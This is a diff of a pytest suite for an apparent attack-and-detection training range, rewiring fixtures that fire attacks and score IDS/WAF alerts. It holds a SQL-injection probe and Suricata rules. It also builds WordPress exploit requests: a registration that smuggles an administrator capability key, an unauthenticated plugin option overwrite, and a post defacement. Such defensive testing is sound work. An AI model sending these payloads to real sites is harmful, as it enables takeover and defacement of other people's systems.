@@ -1,19 +1,16 @@
 import json
-import shlex
+import os
+import re
 import time
 import uuid
 from concurrent.futures import ThreadPoolExecutor
-from contextlib import contextmanager
-from datetime import datetime, timedelta, timezone
+from urllib.parse import urlencode
 
 import pytest
-import requests
 
-from conftest import (
-    PLATFORM_URL, TARGET_PUBLIC, credited_to, from_attacker, run_redteam,
-    runs_the_declared_rules, score_when_ready, seen_by_both_engines, target_code,
-)
-from range import ATTACKER, BOARD, missing, run, run_in_turn, run_side_by_side, start_hint
+import plays
+from conftest import STANDING, TARGET_PUBLIC, from_attacker, runs_the_declared_rules
+from range import ATTACKER, BOARD, missing, run, run_side_by_side
 
 CONTROL = "board-sqli-search"
 SECOND_SHAPE = "board-sqli-union-search"
@@ -21,6 +18,7 @@ UNION = "board-sqli-union-search"
 BENIGN_SEARCH = "board-normal-search"
 SQLMAP = "board-sqli-orderby-sqlmap"
 LAST_ATTACK = "board-path-traversal-static"
+EVERY_SQLMAP_VARIANT = os.environ.get("CR_SQLMAP_VARIANTS") == "1"
 
 NOISY_RULE = (
     '\nalert http any any -> any any (msg:"deliberate false positive"; '
@@ -36,174 +34,93 @@ CATCH_ALL = (
     'alert http any any -> any any (msg:"SQL XSS traversal Restricted File"; '
     'flow:established,to_server; http.uri; content:"/"; sid:9009997; rev:1;)\n'
 )
-CATCH_ALL_CASES = (
-    "board-sqli-search", "board-xss-script-tag-in-search", "board-path-traversal-static",
-    "board-normal-search", "board-normal-search-with-apostrophe",
-)
+CATCH_ALL_ATTACKS = ("board-sqli-search", "board-xss-script-tag-in-search", "board-path-traversal-static")
+CATCH_ALL_BENIGN = ("board-normal-search", "board-normal-search-with-apostrophe")
 
-DETECT_WITHOUT_BLOCKING_SEARCH = {
-    "paranoia": 1,
-    "exclusions": [{"rule_id": 949110, "target": "", "path": "/search/"}],
-}
 FABRICATED_LOOT = [{"username": "admin", "password": "admin1234"}]
-TERMINAL_ATTACK = "/search/?q=%27%20OR%201%3D1--"
-TERMINAL_BENIGN = "/search/?q=release"
-TERMINAL_GAP_SECONDS = 6
+SHELL_ATTACK = "/search/?q=%27%20OR%201%3D1--%20{token}"
+WINDOW_GAP_SECONDS = 6
 
 CORP = "corp"
 CORP_DB = "corp-db"
-CORP_HOST = "Host: corp.com"
+CORP_HOST = "corp.com"
+FORM = {"Content-Type": "application/x-www-form-urlencoded"}
 ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
-NONCE_SLOT = "{nonce}"
-REGISTER_NONCE = r'name="_wpnonce" value="\K[^"]+'
-AJAX_NONCE = r'"ajaxSecurity":"\K[a-f0-9]+'
-SUBMISSION_NONCE = r'rbGlobalSubmissionSettings = {"nonce":"\K[a-f0-9]+'
+REGISTER_NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
+AJAX_NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')
+SUBMISSION_NONCE = re.compile(r'rbGlobalSubmissionSettings = {"nonce":"([a-f0-9]+)"')
 DEFACED = {
     "post_title": "Defaced by an unauthenticated guest",
     "post_excerpt": "overwritten without owning this post",
     "post_content": "overwritten without owning this post via rbsm_submit_post postId overwrite",
 }
 POST_FIELDS = ("post_title", "post_content", "post_excerpt", "post_status")
-WINDOW_GAP_SECONDS = 7
-SETTLE_SECONDS = 2
+EFFECT_WAIT = 180.0
 
 
-def open_session(**settings) -> int:
-    created = requests.post(f"{PLATFORM_URL}/api/sessions/", json=settings, timeout=600)
-    assert created.status_code == 201, created.text
-    return created.json()["id"]
+def red_team_cases() -> list[str]:
+    declared = [case for case in plays.declared_cases("board") if case.get("malicious") is True]
+    return [case["name"] for case in declared
+            if EVERY_SQLMAP_VARIANT or not case.get("tool") or case["name"] == SQLMAP]
 
 
-def close_session(session_id):
-    return requests.post(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/close/", json={}, timeout=120
-    )
+def benign_names(wargame: str = "board") -> set[str]:
+    return {case["name"] for case in plays.declared_cases(wargame) if case.get("malicious") is False}
 
 
-@contextmanager
-def shared_session(**settings):
-    session_id = open_session(**settings)
-    try:
-        yield session_id
-    finally:
-        close_session(session_id)
-
-
-def passed_to_the_ids(session_id):
-    tuned = requests.put(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/waf/",
-        json=DETECT_WITHOUT_BLOCKING_SEARCH, timeout=120,
-    )
-    assert tuned.ok, tuned.text
-    for _ in range(30):
-        reload_probe = f"/search/?q=%27%20OR%201%3D1--%20reload{uuid.uuid4().hex[:6]}"
-        if target_code(reload_probe, session=session_id) != 403:
-            return
-        time.sleep(1)
-
-
-def fire(session_id, case, origin=None, timeout=300):
-    body = {"case": case} if origin is None else {"case": case, "origin": origin}
-    return requests.post(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/", json=body, timeout=timeout,
-    )
-
-
-def fired_case_id(session_id, case, origin=None, timeout=300):
-    sent = fire(session_id, case, origin, timeout)
-    assert sent.status_code == 201, sent.text
-    return sent.json()["case_id"]
-
-
-def detections_of(session_id):
-    return requests.get(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/detections/", timeout=120
-    ).json()
-
-
-def signatures(session_id):
-    return {d["detection_id"]: d["signature"] for d in detections_of(session_id)}
-
-
-def rules_of(session_id):
-    return requests.get(
-        f"{PLATFORM_URL}/api/rules/", params={"session": session_id}, timeout=60
-    ).json()["content"]
-
-
-def apply_rules(content, session_id):
-    return requests.post(
-        f"{PLATFORM_URL}/api/rules/apply/",
-        json={"content": content, "session": session_id}, timeout=180,
-    )
-
-
-def auth_users_of(session_id):
+def auth_users_of(lease: int) -> dict:
     body = run(BOARD, [
         "python3", "-c",
         "import urllib.request,sys; "
         "sys.stdout.write(urllib.request.urlopen("
         "'http://127.0.0.1:8000/internal/auth-users', timeout=20).read().decode())",
-    ], session=session_id).stdout
+    ], lease=lease).stdout
     return json.loads(body)
 
 
-def alerts_mentioning(token, session, wait=90):
-    deadline = time.time() + wait
-    while True:
-        requests.post(f"{PLATFORM_URL}/api/sessions/{session}/ingest/", timeout=120)
-        found = [d for d in detections_of(session)
-                 if d["source"] == "suricata" and token in (d.get("path") or "")]
-        if found or time.time() >= deadline:
-            return [dict(requests.get(f"{PLATFORM_URL}/api/detections/{d['id']}/", timeout=60).json()["raw"],
-                         attributed=d["src_ip"]) for d in found]
-        time.sleep(3)
+def probed(played: plays.Played, token: str) -> list[dict]:
+    from_attacker(SHELL_ATTACK.format(token=token), lease=played.lease)
+    return plays.alerts_until(played, lambda listed: bool(with_token(listed, token)))
 
 
-def probed(session):
-    token = f"zz{uuid.uuid4().hex[:10]}"
-    from_attacker(f"/search/?q=%27%20OR%201%3D1--%20{token}", session=session)
-    return alerts_mentioning(token, session)
+def with_token(listed: list[dict], token: str) -> list[dict]:
+    return [alert for alert in listed if token in (alert.get("uri") or "")]
 
 
-def attack_from_the_shell(token, session):
-    payload = f"/search/?q=%27%20OR%201%3D1--%20{token}"
-    run(ATTACKER, ["sh", "-c", f'curl -s -o /dev/null --max-time 20 "http://board.com{payload}"'],
-        session=session)
-    return alerts_mentioning(token, session)
-
-
-def typed(command, session_id):
+def typed(command: str, lease: int):
     shell = f"printf '{command}\\nexit\\n' | bash -i"
-    return run(ATTACKER, ["bash", "-c", shell], timeout=120, session=session_id)
+    return run(ATTACKER, ["bash", "-c", shell], timeout=120, lease=lease)
+
+
+def seen_by_both(listed: list[dict], marker: str) -> bool:
+    return {"ids", "waf"} <= plays.engines(listed, marker)
 
 
 @pytest.fixture(scope="session")
 def full_run(stack_is_up):
-    session_id = run_redteam()
+    STANDING.release()
+    with plays.Round("board") as played:
+        markers = {name: plays.fired(played, name)["marker"] for name in red_team_cases()}
+        benign = benign_names()
 
-    def ready(totals):
-        if totals["tp"] <= 0:
-            return False
-        if "modsecurity" not in {d["source"] for d in detections_of(session_id)}:
-            return False
-        return bool(credited_to(session_id, totals, name=CONTROL)) and bool(
-            credited_to(session_id, totals, name=LAST_ATTACK))
+        def ready(scored):
+            listed = plays.alerts(played)
+            return (plays.totals(scored)["tp"] > 0 and "waf" in {alert["engine"] for alert in listed}
+                    and bool(plays.marked(listed, markers[CONTROL]))
+                    and bool(plays.marked(listed, markers[LAST_ATTACK]))
+                    and bool(benign & set(plays.per_case(scored))))
 
-    score = score_when_ready(session_id, until=ready)
-    seen = {"session_id": session_id, "score": score, "detections": detections_of(session_id)}
-    seen["cases"] = requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/cases/", timeout=120).json()
-    seen["topology"] = requests.get(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/topology/", timeout=120
-    ).json()
-    seen["scored_by"] = {
-        strategy: requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/score/",
-            params={"correlation": strategy}, timeout=120,
-        ).json()
-        for strategy in ("marker", "window")
-    }
-    return seen
+        scored = plays.score_when_ready(played, until=ready)
+        return {
+            "round": played.round,
+            "score": scored,
+            "markers": markers,
+            "alerts": plays.alerts(played),
+            "cases": plays.cases_listed(played),
+            "declared": plays.declared_cases("board"),
+            "topology": plays.topology(played),
+            "scored_by": {strategy: plays.score(played, strategy).body for strategy in ("marker", "window")},
+        }
 
 
 @pytest.fixture(scope="session")
@@ -213,271 +130,153 @@ def score(full_run):
 
 @pytest.fixture(scope="session")
 def board_session(stack_is_up):
-    with shared_session(wargame="board") as session_id:
-        seen = {"session_id": session_id}
-        seen["objectives_at_open"] = requests.post(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
-        )
-        seen["score_while_open"] = requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
-        )
-        seen["canary"] = requests.post(
-            f"{PLATFORM_URL}/api/range/canary/", json={"session": session_id}, timeout=180
-        )
-        case_id = fired_case_id(session_id, CONTROL)
-        seen["case_id"] = case_id
-        loot = f"{PLATFORM_URL}/api/sessions/{session_id}/loot/"
-        seen["fabricated_loot"] = requests.post(loot, json={"loot": FABRICATED_LOOT}, timeout=120)
-        truth = auth_users_of(session_id)
-        rows = [{"username": name, "hash": digest} for name, digest in truth.items()]
-        seen["real_loot"] = requests.post(
-            loot, json={"loot": rows, "case_id": case_id}, timeout=120
-        )
-        seen["closed"] = close_session(session_id)
-        seen["score_once_closed"] = requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
-        ).json()
-
-        def fired_case(totals):
-            return next((c for c in totals["per_case"] if c["case_id"] == case_id), {})
-
-        seen["scored"] = score_when_ready(
-            session_id, until=lambda t: bool(fired_case(t).get("detection_ids"))
-        )
-        seen["own"] = fired_case(seen["scored"])
+    with plays.Round("board") as played:
+        seen = {"round": played.round}
+        seen["objectives_at_start"] = plays.attack_seen(played)["objectives"]
+        seen["score_while_running"] = plays.score(played, client=played.attack)
+        seen["marker"] = plays.fired(played, CONTROL)["marker"]
+        seen["control_alerts"] = plays.marked(
+            plays.alerts_until(played, lambda listed: bool(plays.marked(listed, seen["marker"]))), seen["marker"])
+        seen["fabricated_loot"] = plays.loot(played, FABRICATED_LOOT)
+        truth = auth_users_of(played.lease)
+        seen["real_loot"] = plays.loot(played, [{"username": name, "hash": digest} for name, digest in truth.items()])
+        seen["ended"] = plays.end(played)
+        seen["score_once_ended"] = plays.score(played, client=played.attack)
+        seen["scored"] = plays.score_when_ready(played, until=lambda scored: bool(scored["objectives"]["lost"]))
     return seen
-
-
-def origins_of(session_id):
-    listed = requests.get(
-        f"{PLATFORM_URL}/api/origins/", params={"session": session_id}, timeout=120
-    )
-    assert listed.status_code == 200, listed.text
-    return listed.json()["origins"]
 
 
 @pytest.fixture(scope="session")
 def origins_session(stack_is_up):
-    with shared_session() as session_id:
-        passed_to_the_ids(session_id)
-        origins = origins_of(session_id)
-        elsewhere = next((o for o in origins if not o["default"]), None)
-        places = (("front", ""),) + ((("elsewhere", elsewhere["id"]),) if elsewhere else ())
-        case_ids = {place: fired_case_id(session_id, CONTROL, origin) for place, origin in places}
-        tool = fire(session_id, SQLMAP, "hk", timeout=900)
-        refused = fire(session_id, SQLMAP, "dmz", timeout=120)
-        close_session(session_id)
-
-        def all_seen_by_both(totals):
-            return all(
-                seen_by_both_engines(session_id, totals, case_id=case_id)
-                for case_id in case_ids.values()
-            )
-
-        score = score_when_ready(session_id, until=all_seen_by_both)
-        return {
-            "session_id": session_id,
-            "origins": origins,
-            "sources": {
-                place: {
-                    d["src_ip"] for d in credited_to(session_id, score, case_id=case_id)
-                    if d["src_ip"]
-                }
-                for place, case_id in case_ids.items()
-            },
-            "tool": tool,
-            "refused": refused,
-        }
+    with plays.Round("board") as played:
+        state = plays.attack_seen(played)
+        seen = {"origins": state["origins"], "first": state["hp"]["origin"]}
+        seen["front"] = plays.fired(played, CONTROL)["marker"]
+        moved = plays.next_origin(played)
+        seen["elsewhere"] = moved["origin"]
+        seen["moved"] = plays.fired(played, SECOND_SHAPE)["marker"] if moved["origin"] else None
+        wanted = [marker for marker in (seen["front"], seen["moved"]) if marker]
+        seen["alerts"] = plays.alerts_until(
+            played, lambda listed: all(plays.marked(listed, marker) for marker in wanted))
+        tool = plays.fire(played, SQLMAP)
+        seen["tool"] = tool
+        seen["tool_run"] = plays.finished_run(played, tool.body["run"]) if tool.status == 202 else None
+        seen["tools"] = plays.tools_listed(played)
+        seen["unknown_tool"] = plays.start_tool(played, "not-a-tool", [])
+    return seen
 
 
 @pytest.fixture(scope="session")
 def tuned_session(stack_is_up):
-    with shared_session() as session_id:
-        passed_to_the_ids(session_id)
-        seen = {"session_id": session_id}
-        seen["inside"] = next(zone["subnet"] for zone in requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/topology/", timeout=60
-        ).json()["map"]["zones"] if zone["caption"] == "web")
-        case_id = fired_case_id(session_id, CONTROL)
-        second = fired_case_id(session_id, SECOND_SHAPE)
-        close_session(session_id)
-
-        score = score_when_ready(session_id, until=lambda totals: all(
-            seen_by_both_engines(session_id, totals, case_id=one) for one in (case_id, second)))
-        seen["score"] = score
-        seen["own"] = {
-            d["src_ip"] for d in credited_to(session_id, score, case_id=case_id) if d["src_ip"]
-        }
-        seen["map"] = requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/map/", timeout=120
-        ).json()
-        seen["listed"] = detections_of(session_id)
+    with plays.Round("board") as played:
+        seen = {"round": played.round, "waf": plays.waf_posture(played)}
+        markers = {name: plays.fired(played, name)["marker"] for name in (CONTROL, SECOND_SHAPE)}
+        seen["markers"] = markers
+        seen["alerts"] = plays.alerts_until(
+            played, lambda listed: all(seen_by_both(listed, marker) for marker in markers.values()))
+        seen["score"] = plays.score_when_ready(
+            played, until=lambda scored: {CONTROL, SECOND_SHAPE} <= set(plays.per_case(scored)))
     return seen
 
 
 @pytest.fixture(scope="session")
 def rules_session(stack_is_up):
-    with shared_session() as session_id:
-        passed_to_the_ids(session_id)
-        seen = {"session_id": session_id}
-        baseline_rules = runs_the_declared_rules(session_id)
-        seen["rules_before_invalid"] = rules_of(session_id)
-        seen["invalid"] = apply_rules(NOT_A_RULE, session_id)
-        seen["rules_after_invalid"] = rules_of(session_id)
+    with plays.Round("board") as played:
+        seen = {}
+        baseline = runs_the_declared_rules(played)
+        seen["rules_before_invalid"] = plays.ids_rules(played)["text"]
+        seen["checked_invalid"] = plays.check_ids(played, NOT_A_RULE)
+        seen["invalid"] = plays.apply_ids(played, NOT_A_RULE)
+        seen["rules_after_invalid"] = plays.ids_rules(played)["text"]
 
-        applied = apply_rules(BUFFERLESS, session_id)
+        applied = plays.apply_ids(played, BUFFERLESS)
         assert applied.ok, applied.text
-        union = fired_case_id(session_id, UNION)
+        union = plays.fired(played, UNION)["marker"]
 
-        def credited(totals):
-            owned = next((c for c in totals["per_case"] if c["case_id"] == union), {})
-            sigs = signatures(session_id)
-            return any(sigs.get(d, "").startswith("UNION without a buffer")
-                       for d in owned.get("detection_ids", []))
+        def bufferless_caught(listed):
+            return any(alert["signature"].startswith("UNION without a buffer") for alert in plays.marked(listed, union))
 
-        seen["bufferless"] = (
-            score_when_ready(session_id, until=credited), union, signatures(session_id)
-        )
+        listed = plays.alerts_until(played, bufferless_caught)
+        seen["bufferless"] = (plays.score_when_ready(played, until=lambda scored: UNION in plays.per_case(scored)),
+                              union, listed)
 
-        seen["noisy"] = apply_rules(baseline_rules + PORTED_RULE + NOISY_RULE, session_id)
+        plays.replay(played)
+        seen["noisy"] = plays.apply_ids(played, baseline + PORTED_RULE + NOISY_RULE)
         assert seen["noisy"].ok, seen["noisy"].text
-        fired = {name: fired_case_id(session_id, name) for name in (CONTROL, UNION, BENIGN_SEARCH)}
-        seen["noisy_benign"] = fired[BENIGN_SEARCH]
+        for name in (CONTROL, UNION):
+            plays.fired(played, name)
+        seen["after_noisy"] = plays.score_when_ready(
+            played, until=lambda scored: plays.per_case(scored).get(BENIGN_SEARCH, {}).get("verdict") == "fp")
+        seen["noisy_alerts"] = plays.alerts(played)
 
-        caught_all = apply_rules(CATCH_ALL, session_id)
+        plays.replay(played)
+        caught_all = plays.apply_ids(played, CATCH_ALL)
         assert caught_all.ok, caught_all.text
-        seen["catch_all"] = {fired_case_id(session_id, name) for name in CATCH_ALL_CASES}
-        close_session(session_id)
+        seen["catch_all_markers"] = {name: plays.fired(played, name)["marker"] for name in CATCH_ALL_ATTACKS}
 
-        def ready(totals):
-            verdicts = {case["case_id"]: case["verdict"] for case in totals["per_case"]}
-            caught = [verdicts.get(case_id) for case_id in seen["catch_all"]]
-            return verdicts.get(seen["noisy_benign"]) == "FP" and "TP" in caught and "FP" in caught
+        def caught_both_ways(scored):
+            verdicts = {case: line["verdict"] for case, line in plays.per_case(scored).items()}
+            return ("tp" in {verdicts.get(name) for name in CATCH_ALL_ATTACKS}
+                    and "fp" in {verdicts.get(name) for name in CATCH_ALL_BENIGN})
 
-        seen["after"] = score_when_ready(session_id, until=ready)
-        seen["listed"] = detections_of(session_id)
+        seen["after_catch_all"] = plays.score_when_ready(played, until=caught_both_ways)
+        seen["catch_all_alerts"] = plays.alerts(played)
     return seen
 
 
 @pytest.fixture(scope="session")
 def terminal_session(stack_is_up):
-    with shared_session() as session_id:
-        passed_to_the_ids(session_id)
-        seen = {"session_id": session_id}
-        seen["box"] = dict(
-            requests.get(
-                f"{PLATFORM_URL}/api/attacker/", params={"session": session_id}, timeout=120
-            ).json(),
-            session=session_id,
-        )
-        seen["box_addresses"] = run(
-            ATTACKER, ["sh", "-c", "hostname -I"], session=session_id
-        ).stdout.split()
-        seen["front"] = probed(session_id)
+    with plays.Round("board") as played:
+        state = plays.attack_seen(played)
+        seen = {"round": played.round, "origin": state["hp"]["origin"]}
+        seen["box_addresses"] = run(ATTACKER, ["sh", "-c", "hostname -I"], lease=played.lease).stdout.split()
+        token = f"zz{uuid.uuid4().hex[:10]}"
+        seen["front"] = (token, with_token(probed(played, token), token))
 
-        marker = str(uuid.uuid4())
-        label = f"{PLATFORM_URL}/api/attacker/label/"
-        requests.post(label, json={"case_id": marker, "session": session_id}, timeout=60)
-        try:
-            typed("nmap --version", session_id)
-        finally:
-            requests.post(label, json={"case_id": None, "session": session_id}, timeout=60)
-        typed("echo after", session_id)
-        seen["marker"] = marker
-        seen["commands"] = requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/commands/", timeout=120
-        )
+        typed("nmap --version", played.lease)
+        typed("echo after", played.lease)
+        deadline = time.monotonic() + plays.SCORE_WAIT
+        while True:
+            run_lines = [event["body"].get("command") for event in plays.events(played, {"command.run"})]
+            if {"nmap --version", "echo after"} <= set(run_lines) or time.monotonic() >= deadline:
+                break
+            time.sleep(plays.POLL)
+        seen["commands"] = run_lines
 
-        seen["elsewhere"] = next(
-            (o for o in origins_of(session_id) if not o["default"]), None)
-        if seen["elsewhere"]:
-            origin = f"{PLATFORM_URL}/api/attacker/origin/"
-            token = f"zz{uuid.uuid4().hex[:8]}"
-            try:
-                requests.post(origin, json={"origin": seen["elsewhere"]["id"], "session": session_id},
-                              timeout=60)
-                seen["moved"] = (token, attack_from_the_shell(token, session_id))
-            finally:
-                requests.post(origin, json={"origin": "", "session": session_id}, timeout=60)
+        moved = plays.next_origin(played)
+        seen["elsewhere"] = moved["origin"]
+        if moved["origin"]:
+            token = f"zz{uuid.uuid4().hex[:10]}"
+            seen["moved"] = (token, with_token(probed(played, token), token))
     return seen
-
-
-def label_terminal(case_id, session_id):
-    response = requests.post(
-        f"{PLATFORM_URL}/api/attacker/label/",
-        json={"case_id": case_id, "session": session_id}, timeout=30,
-    )
-    assert response.ok, response.text
-
-
-def record_terminal_window(session_id, name, malicious, source_ip, started_at, ended_at, case_id=None):
-    response = requests.post(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/",
-        json={
-            "case_id": case_id or str(uuid.uuid4()),
-            "name": name,
-            "malicious": malicious,
-            "correlation": "window",
-            "source_ip": source_ip,
-            "started_at": started_at.isoformat(),
-            "ended_at": ended_at.isoformat(),
-        },
-        timeout=30,
-    )
-    assert response.status_code == 201, response.text
-
-
-def scored_by(session_id, strategy):
-    response = requests.get(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/score/", params={"correlation": strategy}, timeout=60,
-    )
-    assert response.ok, response.text
-    return response.json()
-
-
-def verdicts_of(totals):
-    return {case["name"]: case["verdict"] for case in totals["per_case"]}
 
 
 @pytest.fixture(scope="session")
 def terminal_windows(stack_is_up):
-    with shared_session() as session_id:
-        passed_to_the_ids(session_id)
-        attacker = requests.get(f"{PLATFORM_URL}/api/attacker/", params={"session": session_id}, timeout=60)
-        assert attacker.ok, f"the attacker box is not available: {attacker.text}. Run `{start_hint()}`."
-        source_ip = attacker.json()["source_ip"]
+    with plays.Round("board") as played:
+        seen = {"origin": plays.attack_seen(played)["hp"]["origin"]}
+        time.sleep(WINDOW_GAP_SECONDS)
+        token = f"zz{uuid.uuid4().hex[:10]}"
+        started = plays.start_tool(played, "whatweb", [f"{TARGET_PUBLIC}{SHELL_ATTACK.format(token=token)}"])
+        assert started.status == 202, started.text
+        plays.finished_run(played, started.body["run"])
+        seen["window_token"] = token
+        time.sleep(WINDOW_GAP_SECONDS)
+        seen["control"] = plays.fired(played, CONTROL)["marker"]
 
-        time.sleep(TERMINAL_GAP_SECONDS)
-        started = datetime.now(timezone.utc)
-        from_attacker(TERMINAL_BENIGN, session=session_id)
-        record_terminal_window(session_id, "terminal-benign", False, source_ip, started, datetime.now(timezone.utc))
-        time.sleep(TERMINAL_GAP_SECONDS)
+        def ready(scored):
+            free = {row["ip"]: row for row in scored["free_actions"]["by_origin"]}
+            line = plays.per_case(scored).get(CONTROL, {})
+            return line.get("verdict") == "tp" and free.get(seen["origin"]["ip"], {}).get("alerts", 0) > 0
 
-        started = datetime.now(timezone.utc)
-        from_attacker(TERMINAL_ATTACK, session=session_id)
-        record_terminal_window(session_id, "terminal-sqli", True, source_ip, started, datetime.now(timezone.utc))
-        time.sleep(TERMINAL_GAP_SECONDS)
-
-        labelled = str(uuid.uuid4())
-        label_terminal(labelled, session_id)
-        try:
-            started = datetime.now(timezone.utc)
-            from_attacker(TERMINAL_ATTACK, session=session_id)
-            ended = datetime.now(timezone.utc)
-        finally:
-            label_terminal(None, session_id)
-        record_terminal_window(session_id, "terminal-both-ways", True, source_ip, started, ended, labelled)
-
-    def ready(totals):
-        verdicts = verdicts_of(totals)
-        return (verdicts.get("terminal-sqli") == verdicts.get("terminal-both-ways") == "TP"
-                and seen_by_both_engines(session_id, totals, name="terminal-sqli"))
-
-    seen = {"session_id": session_id, "score": score_when_ready(session_id, until=ready)}
-    seen["sqli_seen_by_both"] = seen_by_both_engines(session_id, seen["score"], name="terminal-sqli")
-    seen["by"] = {strategy: scored_by(session_id, strategy) for strategy in ("marker", "window")}
-    seen["detections"] = detections_of(session_id)
+        seen["score"] = plays.score_when_ready(played, until=ready)
+        seen["by"] = {strategy: plays.score(played, strategy).body for strategy in ("marker", "window")}
+        seen["alerts"] = plays.alerts(played)
     return seen
+
+
+def verdicts_of(scored: dict) -> dict[str, str]:
+    return {case: line["verdict"] for case, line in plays.per_case(scored).items()}
 
 
 def wordpress_db(sql):
@@ -497,10 +296,6 @@ def option_query(name):
     return wordpress_db(f"SELECT option_value FROM wp_options WHERE option_name='{name}';")
 
 
-def option_update(name, value):
-    return wordpress_db(f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';")
-
-
 def post_query(post_id):
     return wordpress_db(f"SELECT {','.join(POST_FIELDS)} FROM wp_posts WHERE ID={post_id};")
 
@@ -518,90 +313,46 @@ def post_in(out):
     return dict(zip(POST_FIELDS, out.rstrip("\n").split("\t", len(POST_FIELDS) - 1)))
 
 
-def admin_ids(session=None):
-    return ids_in(run(CORP_DB, ADMINS, session=session).stdout)
+def admin_ids(lease):
+    return ids_in(run(CORP_DB, ADMINS, lease=lease).stdout)
 
 
-def post_row(post_id, session=None):
-    return post_in(run(CORP_DB, post_query(post_id), session=session).stdout)
+def post_row(post_id, lease):
+    return post_in(run(CORP_DB, post_query(post_id), lease=lease).stdout)
 
 
-def with_nonce(page, pattern, *sent, session=None):
-    fetched = shlex.join(["curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}{page}"])
-    requests_sent = "; echo; ".join(
-        shlex.join(argv).replace(NONCE_SLOT, "'\"$nonce\"'") for argv in sent
-    )
-    script = (
-        f"nonce=$({fetched} | grep -oP {shlex.quote(pattern)} | head -n 1); "
-        f"printf '%s\\n' \"$nonce\"; [ -n \"$nonce\" ] || exit 0; {requests_sent}"
-    )
-    nonce, _, said = run(ATTACKER, ["sh", "-c", script], session=session).stdout.partition("\n")
-    return nonce.strip(), said.strip()
+def nonce_from(played: plays.Played, page: str, pattern: re.Pattern) -> str:
+    fetched = plays.send(played, "GET", page, host=CORP_HOST)
+    assert fetched.ok, fetched.text
+    found = pattern.search(fetched.body["body"])
+    assert found or not fetched.body["truncated"], (
+        f"{page} came back cut at the attack API's body limit before its nonce; the exploit needs the whole page")
+    return found.group(1) if found else ""
 
 
-def registration(login):
-    return [
-        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
-        "-H", CORP_HOST,
-        "--data", "form_id=5",
-        "--data", "um_request=",
-        "--data", f"_wpnonce={NONCE_SLOT}",
-        "--data", "_wp_http_referer=/register/",
-        "--data", f"user_login-5={login}",
-        "--data", "first_name-5=North",
-        "--data", "last_name-5=Wind",
-        "--data", f"user_email-5={login}@example.com",
-        "--data", "user_password-5=Str0ng-Pass-9271",
-        "--data", "confirm_user_password-5=Str0ng-Pass-9271",
-        "--data", ROGUE_KEY,
-        f"{TARGET_PUBLIC}/register/",
-    ]
+def posted(played: plays.Played, path: str, form: str, query: dict | None = None) -> plays.Answer:
+    return plays.send(played, "POST", path, host=CORP_HOST, headers=FORM, body=form, query=query or {})
 
 
-def option_flip(name, value):
-    return [
-        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
-        "-H", CORP_HOST,
-        "--data", f'data={{"type":"save_setting","append":false,"option":"{name}","value":"{value}"}}',
-        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={NONCE_SLOT}",
-    ]
+def registration(login: str, nonce: str) -> str:
+    return urlencode({
+        "form_id": "5", "um_request": "", "_wpnonce": nonce, "_wp_http_referer": "/register/",
+        "user_login-5": login, "first_name-5": "North", "last_name-5": "Wind",
+        "user_email-5": f"{login}@example.com", "user_password-5": "Str0ng-Pass-9271",
+        "confirm_user_password-5": "Str0ng-Pass-9271",
+    }) + "&" + ROGUE_KEY
 
 
-def post_overwrite(post_id):
-    return [
-        "curl", "-s", "--max-time", "20",
-        "-H", CORP_HOST,
-        "--data-urlencode", "action=rbsm_submit_post",
-        "--data-urlencode", f"_nonce={NONCE_SLOT}",
-        "--data-urlencode", "formId=1",
-        "--data-urlencode", f"postId={post_id}",
-        "--data-urlencode", f"title={DEFACED['post_title']}",
-        "--data-urlencode", f"excerpt={DEFACED['post_excerpt']}",
-        "--data-urlencode", f"content={DEFACED['post_content']}",
-        "--data-urlencode", "userName=Anonymous Contributor",
-        "--data-urlencode", "userEmail=anon@example.com",
-        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
-    ]
+def option_flip(name: str, value: str) -> str:
+    return urlencode({"data": f'{{"type":"save_setting","append":false,"option":"{name}","value":"{value}"}}'})
 
 
-def site_restored(created, original):
-    return {
-        **{f"user {uid}": ["wp", "--allow-root", "user", "delete", str(uid), "--yes", "--network"]
-           for uid in sorted(created)},
-        "post": [
-            "wp", "--allow-root", "post", "update", original["ID"],
-            f"--post_title={original['post_title']}",
-            f"--post_excerpt={original['post_excerpt']}",
-            f"--post_status={original['post_status']}",
-        ],
-        **{meta: ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta]
-           for meta in ("rbsm_form_id", "rbsm_author_info")},
-    }
-
-
-def content_restored(original):
-    quoted = "'" + original["post_content"].replace("'", "\\'") + "'"
-    return wordpress_db(f"UPDATE wp_posts SET post_content={quoted} WHERE ID={original['ID']}")
+def post_overwrite(post_id: str, nonce: str) -> str:
+    return urlencode({
+        "action": "rbsm_submit_post", "_nonce": nonce, "formId": "1", "postId": post_id,
+        "title": DEFACED["post_title"], "excerpt": DEFACED["post_excerpt"], "content": DEFACED["post_content"],
+        "userName": "Anonymous Contributor", "userEmail": "anon@example.com",
+    })
 
 
 def corp_is_declared():
@@ -614,130 +365,57 @@ def corp_is_declared():
     )
 
 
-def finished(*calls):
-    with ThreadPoolExecutor(max_workers=len(calls)) as pool:
-        return [pool.submit(call) for call in calls]
-
-
-def settled(since, seconds):
-    time.sleep(max(0.0, since + seconds - time.monotonic()))
-
-
